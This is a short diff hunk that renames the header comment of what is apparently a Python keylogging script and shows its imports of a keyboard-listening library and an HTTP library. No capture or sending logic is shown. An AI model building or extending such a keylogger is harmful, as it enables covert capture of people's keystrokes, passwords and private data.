@@ -1,4 +1,4 @@
-#My Keylogging Script
+#Keylogging Script
 
 from pynput import keyboard
 import requests
